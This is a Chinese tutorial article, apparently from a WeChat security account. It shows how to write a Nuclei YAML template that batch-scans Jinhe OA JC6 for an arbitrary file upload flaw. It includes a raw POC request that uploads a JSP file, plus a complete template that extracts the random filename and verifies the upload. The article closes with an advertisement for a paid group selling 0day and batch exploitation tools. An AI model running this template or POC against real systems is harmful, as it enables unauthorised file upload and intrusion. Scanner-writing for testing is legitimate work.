> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZecjaZJPqTU-LXvHtU0shQ)

****本文由安云安全内部群 - 鲁鲁师傅原创投稿****

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**前情提要**

  

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**基础篇没看过的师傅建议先看一下关于 Yaml 脚本的基础知识及往期文章：**  

[**【脚本编写】Nuclei-yaml 脚本速成新手教程 --SQL 注入篇**](http://mp.weixin.qq.com/s?__biz=MzU3MjU4MjM3MQ==&mid=2247485665&idx=1&sn=383b437d4964a6b6ddac0d087d46be8a&chksm=fccff86dcbb8717b90013e0236cdfdfa787796e4613faa43a3cf88c26cb6c1ab57493446e1e7&scene=21#wechat_redirect)  

**[【脚本编写】Nuclei-yaml 脚本速成新手教程 --SQL 注入篇](http://mp.weixin.qq.com/s?__biz=MzU3MjU4MjM3MQ==&mid=2247485665&idx=1&sn=383b437d4964a6b6ddac0d087d46be8a&chksm=fccff86dcbb8717b90013e0236cdfdfa787796e4613faa43a3cf88c26cb6c1ab57493446e1e7&scene=21#wechat_redirect)**

**[【脚本编写】Nuclei-yaml 脚本速成新手教程 -- 信息泄露、文件上传篇](http://mp.weixin.qq.com/s?__biz=MzU3MjU4MjM3MQ==&mid=2247485860&idx=1&sn=4195d827d8f65e7bd14ce68c67d1c291&chksm=fccff928cbb8703e5a367a3f7ea627af94c47143c96e607347ac6fce11ac5a5ff81066b1f0ac&scene=21#wechat_redirect)**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ickP7mRo94TVlbfkvCIqCuCEOHxHguWKLHt8K0uEWcLusDsJvTR8ZoicMOJra6n2t0OYnMB2r7VzYg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**文件上传篇 2**

  

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

****上回我们说了用 yaml 编写文件上传漏洞的第一种情况 “固定文件名 + 路径”，这次我们主要说第另外一种：****

**固定上传路径 + 随机文件名**

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**案例说明**

  

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

****金和 OA JC6 Upload 任意文件上传漏洞，作为演示案例****

```
web.body="JC6金和协同管理平台"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTDpPS75h1zcf73s9eNNtRfK4QRnM7pLMYqicuT2ubV4ErErbreehBPT2A/640?wx_fmt=png&from=appmsg)

**POC 如下：**

```
POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: {{Hostname}}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 169
--00content0boundary00
Content-Disposition: form-data; 
Content-Type: image/jpeg
<% out.println("hello"); %>
--00content0boundary00--

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTD7suYgTbH3QYEia3f7N7Xs4Kw7iaVeeJ7MV2wATHSFWb0THIchslH5Jow/640?wx_fmt=png&from=appmsg)

**文件上传位置如下：**

```
/jc6/upload/402882838d63f2dd018d77bce0766e8f.jsp

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTDRu1RsnAQ57icmXZ6ibQEMHA8MK35BmtSkVV2HZFc0hu4vibv0FbM23dCg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**yaml 文件编写**

  

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

  ****因为每次发包后，上级目录和文件名都是不固定的，虽然这种情况比我们之前说的 “固定上传路径 + 固定文件名的方式” 略微复杂一些，但是并不影响我们写成 yaml 来批量扫描；****

 **首先，分析下 poc 的具体情况：****POST 请求提交上传数据 + 文件名，****知道了具体漏洞特征后，我们开始编写批量扫描脚本吧：****老规矩，先把模板的标题和信息块固定好**

```
id: jinhe-JC6-Upload-uploadfile
info:
  name: jinhe-JC6-Upload-uploadfile
  author: 思沃科技
  severity: critical
  description: 金和OA JC6 Upload任意文件上传漏洞

```

**完整 yaml 请求体为：**

```
id: jinhe-JC6-Upload-uploadfile
info:
  name: jinhe-JC6-Upload-uploadfile
  author: 思沃科技
  severity: critical
  description: 金和OA JC6 Upload任意文件上传漏洞
http:
  - raw:
      - |
        POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-Length: 169
        --00content0boundary00
        Content-Disposition: form-data; 
        Content-Type: image/jpeg
        <% out.println("hello"); %>    #上传文件内容为hello
        --00content0boundary00--

```

 **标题和请求体都放入了 yaml 中，现在我们不知道它具体返回包的样子，所以没法去写具体的匹配规则，这里，我们还是用笨办法，先写个模糊的匹配规则，来进行测试。**

**先整理下思路：**

**1. 该 POC 上传文件类型为 jsp 格式**

**2. 如果上传成功，那么返回包中可能存在 jsp 文件信息；**

**3. 上传成功了，大概率返回的响应码是 200；**

**根据上述三个猜想来看，我们只要匹配返回包信息中，包含. jsp 以及 HTTP 响应码为 200 的特征，那么就有可能会得到想要的结果。**

**依然可以照搬《文件上传 2》的方式来**

**说干就干！构思完成后的匹配规则如下：**

```
    matchers:        # 匹配器
      - type: status  #定义匹配类型为status（响应码）
        status:
          - 200       # 响应码为200
      - type: word    #定义第二个匹配条件为关键词
        part: body    #匹配位置：返回包的body处
        words:
          - ".jsp"   #匹配返回包中，包含.jsp字符串的内容
    matchers-condition: and     #上述两个条件均匹配，然后返回为true

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTDPJBWIZsEpS1nkvJFOscsib7PbkQBrwlsU9icZweE4vH8m6cTJ6lSubibA/640?wx_fmt=png&from=appmsg)

**有命中，说明规则应该是没问题的，我们通过 --debug，来看下返回包信息：**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTDwIdcFrR5tRrzdjM0ia8WAEIicQeKPxL1ELxDzbsGY8WCfKVvd5IDnh2Q/640?wx_fmt=png&from=appmsg)

**通过观察，我们发现，该命中特征，有两个地方需要注意：**

**1. 上传根目录为 / upload/**

**2. 文件名为 MD5 的 32 位加密. jsp 文件**

**知道了返回包结构，我们继续完善 yaml 脚本**

**这里需要用到正则匹配器 extractors 的 regex 方法来匹配 MD5**

```
extractors:    #正则提取器
  - type: regex   #正则表达式
    part: body    # 匹配位置为返回包的body位置
    internal: true  #因为我们要从终端信息中提取内容，所以需要用到这个参数
    name: wj   #定义变量名wj，意思是将正则表达式匹配到的内容，保存到wj变量中；
    regex:
      - ([0-9a-z]{32}).jsp   #匹配数字0-9，小写字母a-z，并且长度为32位，结尾为.jsp的内容

```

**因为 32 位 MD5 分大写、小写两种情况，这个漏洞返回的上传文件名，为 32 位小写 MD5，所以，这里用 0-9a-z 的范围来匹配**

**匹配规则写好了，我们完善下我们的 yaml 脚本:**

**1. 我们将正则表达式提取到的数据，赋值到了 wj 变量中，wj=32 位 MD5 的字符串. jsp****（在 yaml 文件中，记得变量是 {{wj}}）的，而不是 $wj)**

**2. 文件上传路径为 / upload/（这里要注意下，因为金和 JC6，部分站点的默认根目录为 / jc6/，所以我们在上传根目录前面加上它，最终变成 / jc6/upload/）**

**3. 确认文件是否存在，需要用到 GET 方法，以及返回包的响应码为 200，这还不够，我们还需要****匹配该响应码下的文件内容中，是否包含我们写入的字符串****；**

**基于上述三点，最终形成了这样的匹配规则:**

```
 extractors:    #正则提取器
      - type: regex   #正则表达式
        part: body    # 匹配位置为返回包的body位置
        internal: true  #因为我们要从终端信息中提取内容，所以需要用到这个参数
        name: wj   #定义变量名wj，意思是将正则表达式匹配到的内容，保存到wj变量中；
        regex:
          - ([0-9a-z]{32}).jsp   #匹配数字0-9，小写字母a-z，并且长度为32位，结尾为.jsp的内容
  matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"hello")'

```

**好了，规则写完，完整 yaml 如下：**

```
id: jinhe-JC6-Upload-uploadfile
info:
  name: jinhe-JC6-Upload-uploadfile
  author: 思沃科技
  severity: critical
  description: 金和OA JC6 Upload任意文件上传漏洞
http:
  - raw:
      - |
        POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Content-Type: multipart/form-data; boundary=00content0boundary00
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Content-Length: 169
        --00content0boundary00
        Content-Disposition: form-data; 
        Content-Type: image/jpeg
        <% out.println("hello"); %>
        --00content0boundary00--
      - |                            #新增一个GET请求
        GET /jc6/upload/{{wj}} HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Host: {{Hostname}}
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
    extractors:
      - type: regex
        part: body
        internal: true
        name: wj
        regex:
          - ([0-9a-z]{32}).jsp
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2==200 && contains_all(body_2,"hello")'    #匹配响应码为200，并且文本内容包含hello字符串的页面
#这里有个细节，最后面的规则，我都加了个_2，表示匹配第二个请求体的结果，这样会更精确一些，不加的话也行，只不过会匹配全局所有请求，那么可能会存一点点的误报率。

```

**最终测试结果**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTD00RkjQtJoiaODcbqwmmR1tQaY2bQtm5TvgQostFS3WZiaM7iccdXibib1OQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibZ6vhK1oficMdVnCxa8GDTDJKqKz0VsHMyk0ia8Lk17ibbicjUDqmvNkMU2HP1qnRaVHZicia5FBWfAGKw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**写在最后**

  

**![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)**

  

 **这篇文章主要讲了 Nuclei-yaml 脚本速成新手教程 -- **固定上传路径 + 随机文件名文件上传**篇的内容，后面我会将随机文件名 + 随机文件上传路径、暴力破解、未授权访问、命令执行等常见的情况，通过笔记的方式分享给各位师傅，逐步完善，希望能给大家带来帮助。**

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

  

**圈子介绍**

  

**![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)**

  

  

高质量漏洞利用工具分享社区，每天至少更新一个 0Day/Nday/1day 及对应漏洞的批量利用工具，团队内部 POC 分享，星球不定时更新内外网攻防渗透技巧以及最新学习研究成果等。如果师傅还是新手，内部的交流群有很多行业老师傅可以为你解答学习上的疑惑，内部分享的 POC 可以助你在 Edu 和补天等平台获得一定的排名。如果师傅已经是老手了，有一个高质量的 LD 库也能为你的工作提高极大的效率，实战或者攻防中有需要的 Day 我们也可以通过自己的途径帮你去寻找。

**【圈子服务】**

1，一年至少 365 + 漏洞 Poc 及对应漏洞批量利用工具

2，Fofa 永久高级会员

3，24HVV 内推途径

4，Cmd5 解密，各种漏洞利用工具及后续更新，渗透工具、文档资源分享

5，内部漏洞库情报分享（目前已有 2000+poc，会定期更新，包括部分未公开 0/1day）

6，加入内部微信群，认识更多的行业朋友（群里有 100+C**D 通用证书师傅），遇到任何技术问题都可以进行快速提问、讨论交流；

圈子目前价格为 **129 元** **(交个朋友啦！)**，现在星球有近 900 + 位师傅相信并选择加入我们，人数满 1000 **涨价至 149**，圈子每天都会更新内容。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/yeJvia5dNx5ibmJXuUnaww610JyW2aMD7XyghxoOEL12QTuKPMtygJ7abCibjickyRUpBPDf52hoXPRu3nWEmjzt5A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp)

  

******圈子近期更新 LD 库******

  

![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp)

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5icGAicc9zic36VLMjSIw4tuuYYOibjy0SsMZocxIG1R9y98PWXDvNqM1960icdrrutajzQFFGocYPXkoA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibK7Dv4GdXpIuKGmLtjmiaeQficiaBuBynNtjeUYhYhGfnib3n8uVPhLoJiayrm6j7LulicIBF5AU5xBHQQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)**

**每篇文章均有详细且完整 WriteUp**

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/yeJvia5dNx5ibK7Dv4GdXpIuKGmLtjmiaeQuz0vbaPubOpv3oWAehI3Pr5flA7KQSUWtKIyycZezdAxmic5rpy2tHw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

**一起愉快的刷分**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ibz6ibFL4b8QBThc3t0ok0Gb7jsseWcrYsxNbv9qyQ0uhDib7TkUcLIIos2iaYlzL6TcF3ia2Rric1EH1g/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/yeJvia5dNx5ickvP43lKosLxs8SB5kCSQQEP05NRM08qqN1YIrU1QF8ILRniaF4Vu2jbHhTypliczTnEuK5TXobk9A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)